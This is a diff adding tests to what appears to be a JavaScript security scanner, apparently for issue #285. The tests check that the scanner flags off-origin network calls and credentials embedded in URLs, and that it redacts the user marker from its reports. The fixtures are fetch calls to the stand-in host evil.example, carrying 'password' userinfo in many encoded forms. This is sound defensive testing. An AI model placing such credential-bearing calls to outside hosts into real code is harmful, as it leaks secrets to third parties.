@@ -364,6 +364,32 @@ describe('diagnostic output boundary (#285)', () => {
 });
 
 describe('encoded and binary diagnostic output (#285)', () => {
+  const encodedCharacters = Array.from({ length: 95 }, (_, index) => index + 32)
+    .flatMap((code) => {
+      const hex = code.toString(16).padStart(2, '0');
+      return [`%${hex}`, `%25${hex}`, String.raw`\x${hex}`, String.raw`\u00${hex}`];
+    });
+  it.each(encodedCharacters)('keeps encoded character %s out of reported authority', (encoded) => {
+    const marker = 'SYNTH_USER_285';
+    const source = `fetch("https://${marker}${encoded}:password@evil.example/x")`;
+    const hits = scan(source);
+    expect(rules(hits).some((rule) => rule.startsWith('emitted-off-origin-dial'))).toBe(true);
+    expect(JSON.stringify(hits).toLowerCase()).not.toContain(marker.toLowerCase());
+    const binary = scan(source, new Set(['emitted-url-userinfo']));
+    expect(binary.length).toBeGreaterThan(0);
+    expect(JSON.stringify(binary).toLowerCase()).not.toContain(marker.toLowerCase());
+  });
+  it.each(['%20', '%22', '%27', '%60', '%29', '%3e', String.raw`\x22`, String.raw`\u0020`])(
+    'omits decoded delimiter %s from emitted and binary CLI output', (encoded) => {
+      const marker = 'SYNTH_USER_285';
+      const source = `fetch("https://${marker}${encoded}:password@evil.example/x")`;
+      for (const asset of ['index.js', 'metadata.png']) {
+        const output = capturedCliOutput(source, asset);
+        expect(output).toMatch(/\[emitted-(off-origin-dial|url-userinfo)/);
+        expect(output.toLowerCase()).not.toContain(marker.toLowerCase());
+      }
+    },
+  );
   it.each(['%2f', '%252f', '%5c', String.raw`\x2f`, String.raw`\u002f`])(
     'never reinterprets userinfo containing %s as a hostname', (separator) => {
       const marker = 'SYNTH_USER_285';
@@ -408,7 +434,7 @@ describe('encoded and binary diagnostic output (#285)', () => {
     const hits = scan(source);
     expect(rules(hits)).toContain('emitted-off-origin-dial');
     expect(hits.find((hit) => hit.rule === 'emitted-off-origin-dial')?.value)
-      .toBe('destination=https://evil.example');
+      .toBe('destination=off-origin');
     expect(JSON.stringify(hits)).not.toContain(marker);
     const output = capturedCliOutput(source);
     expect(output).toContain('[emitted-off-origin-dial]');
